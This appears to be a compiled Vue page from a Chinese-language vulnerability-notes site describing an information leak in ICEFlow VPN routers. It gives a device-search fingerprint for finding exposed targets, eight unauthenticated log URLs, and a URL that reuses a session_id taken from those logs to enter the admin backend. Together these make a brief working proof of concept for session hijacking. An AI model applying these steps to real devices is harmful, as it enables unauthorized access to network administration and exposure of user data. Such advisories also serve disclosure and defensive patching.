import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as l}from"./app-58e4a7d6.js";const n={},d=l(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>ICEFlow VPN 存在信息泄露漏洞，攻击者可以查看日志中的敏感数据来进一步攻击系统</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ICEFlow VPN
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;ICEFLOW VPN Router&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>可访问的日志 Url</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>系统日志    http://url/log/system.log
VPN日志    http://url/log/vpn.log
访问日志	http://url/log/access.log
告警日志	http://url/log/warn.log
错误日志	http://url/log/error.log
调试日志	http://url/log1/debug.log
移动用户日志 http://url/log/mobile.log
防火墙日志	http://url/log/firewall.log
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101850471.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>根据日志信息获得session后，可利用实时登录系统管理后台：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/cgi-bin/index?oid=10&amp;session_id=xxxxxxxxxxxxxx&amp;l=0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,12),t=[d];function r(s,o){return a(),i("div",null,t)}const x=e(n,[["render",r],["__file","ICEFlow VPN 信息泄露漏洞.html.vue"]]);export{x as default};
